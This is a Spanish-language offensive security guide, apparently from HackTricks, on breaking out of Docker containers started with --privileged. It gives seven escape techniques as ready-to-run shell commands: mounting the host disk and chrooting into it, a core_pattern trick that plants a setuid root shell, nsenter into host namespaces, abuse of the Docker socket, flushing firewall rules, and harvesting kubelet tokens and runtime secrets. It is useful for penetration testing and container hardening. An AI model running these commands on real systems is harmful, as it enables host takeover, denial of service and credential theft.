# Escaping From `--privileged` Containers

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Un contenedor iniciado con `--privileged` no es lo mismo que un contenedor normal con uno o dos permisos adicionales. En la práctica, `--privileged` elimina o debilita varias de las protecciones predeterminadas del runtime que normalmente mantienen la carga de trabajo alejada de recursos peligrosos del host. El efecto exacto depende del runtime y del host, pero en Docker el resultado habitual es:

- se otorgan todas las capabilities
- se eliminan las restricciones del device cgroup
- muchos sistemas de archivos del kernel dejan de montarse como de solo lectura
- desaparecen las rutas predeterminadas enmascaradas de procfs
- se deshabilita el filtrado de seccomp
- se deshabilita el confinamiento de AppArmor
- se deshabilita el aislamiento de SELinux o se reemplaza por una etiqueta mucho más amplia

La consecuencia importante es que un contenedor privilegiado normalmente **no** necesita un exploit sutil del kernel. En muchos casos puede interactuar directamente con dispositivos del host, sistemas de archivos del kernel orientados al host o interfaces del runtime, y después pivotar a una shell del host.

## Lo que `--privileged` no cambia automáticamente

`--privileged` **no** se une automáticamente a los namespaces de PID, red, IPC o UTS del host. Un contenedor privilegiado todavía puede tener namespaces privados. Esto significa que algunas cadenas de escape requieren una condición adicional, como:

- un bind mount del host
- compartir los PID del host
- networking del host
- dispositivos del host visibles
- interfaces proc/sys con permisos de escritura

Estas condiciones suelen ser fáciles de satisfacer en configuraciones incorrectas reales, pero conceptualmente son independientes de `--privileged`.

## Vectores de escape

### 1. Montar el disco del host mediante dispositivos expuestos

Un contenedor privilegiado normalmente ve muchos más nodos de dispositivo bajo `/dev`. Si el dispositivo de bloques del host es visible, el escape más sencillo consiste en montarlo y ejecutar `chroot` en el sistema de archivos del host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Si la partición root no es evidente, enumera primero la distribución de bloques:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Si la vía práctica consiste en colocar un helper setuid en un mount del host con permisos de escritura en lugar de usar `chroot`, recuerda que no todos los filesystems respetan el bit setuid. Una comprobación rápida de capabilities desde el host es:
```bash
mount | grep -v "nosuid"
```
Esto es útil porque las rutas con permisos de escritura en filesystems `nosuid` son mucho menos interesantes para los flujos de trabajo clásicos de «depositar una shell setuid y ejecutarla posteriormente».

Las protecciones debilitadas que se abusan aquí son:

- exposición completa de dispositivos
- capabilities amplias, especialmente `CAP_SYS_ADMIN`

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montar o reutilizar un bind mount del host y `chroot`

Si el filesystem root del host ya está montado dentro del container, o si el container puede crear los mounts necesarios porque tiene privilegios, una shell del host suele estar a solo un `chroot` de distancia:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si no existe un bind mount de la raíz del host pero el almacenamiento del host es accesible, crea uno:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Este path abusa de:

- restricciones de mount debilitadas
- capabilities completas
- falta de confinamiento MAC

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abusar de `/proc/sys` o `/sys`

Una de las principales consecuencias de `--privileged` es que las protecciones de procfs y sysfs se vuelven mucho más débiles. Esto puede exponer interfaces del kernel orientadas al host que normalmente están enmascaradas o montadas como de solo lectura.

Un ejemplo clásico es `core_pattern`:<sup>[[1]](#references)</sup>
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Otros paths de alto valor incluyen:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Este path abusa de:

- rutas masked ausentes
- rutas de sistema de solo lectura ausentes

Páginas relacionadas:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Usar Full Capabilities Para Un Escape Basado En Mount O Namespace

Un contenedor privilegiado obtiene las capabilities que normalmente se eliminan de los contenedores estándar, incluidas `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` y muchas otras. A menudo, esto basta para convertir un foothold local en un escape al host en cuanto existe otra superficie expuesta.

Un ejemplo sencillo consiste en montar filesystems adicionales y usar la entrada en un namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Si el PID del host también se comparte, el paso se vuelve aún más corto:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Esta vía abusa de:

- el conjunto predeterminado de capabilities privilegiadas
- el uso compartido opcional del PID del host

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escapar a través de los sockets del Runtime

Un contenedor privilegiado suele terminar teniendo visible el estado o los sockets del Runtime del host. Si se puede acceder a un socket de Docker, containerd o CRI-O, el enfoque más sencillo suele ser utilizar la API del Runtime para iniciar un segundo contenedor con acceso al host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Para containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Este path abusa de:

- exposición de un runtime privilegiado
- bind mounts del host creados a través del propio runtime

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Eliminar los efectos secundarios del aislamiento de red

`--privileged` no se une por sí mismo al network namespace del host, pero si el contenedor también tiene `--network=host` u otro acceso a la red del host, toda la pila de red se vuelve mutable:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Esto no siempre proporciona un shell directo en el host, pero puede provocar una denegación de servicio, interceptar tráfico o acceder a servicios de administración limitados a loopback.

Páginas relacionadas:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Leer secretos del host y el estado del runtime

Incluso cuando no es posible realizar de inmediato un escape limpio del shell, los contenedores privilegiados suelen tener suficiente acceso para leer secretos del host, el estado de kubelet, los metadatos del runtime y los sistemas de archivos de los contenedores vecinos:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Si `/var` está montado desde el host o los directorios de runtime son visibles, esto puede ser suficiente para realizar lateral movement o robar credenciales de cloud/Kubernetes incluso antes de obtener un shell en el host.

Páginas relacionadas:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Comprobaciones

El propósito de los siguientes comandos es confirmar qué familias de escape desde privileged containers son viables de inmediato.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Qué es interesante aquí:

- un conjunto completo de capabilities, especialmente `CAP_SYS_ADMIN`
- exposición escribible de proc/sys
- dispositivos del host visibles
- ausencia de seccomp y confinamiento MAC
- sockets del runtime o bind mounts del root del host

Cualquiera de estos elementos puede ser suficiente para el post-exploitation. Varios juntos normalmente significan que el contenedor está, funcionalmente, a uno o dos comandos de comprometer el host.

## Páginas relacionadas

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

## Referencias

- [1] [Escaping privileged containers for fun](https://pwning.systems/posts/escaping-containers-for-fun/)

{{#include ../../../banners/hacktricks-training.md}}
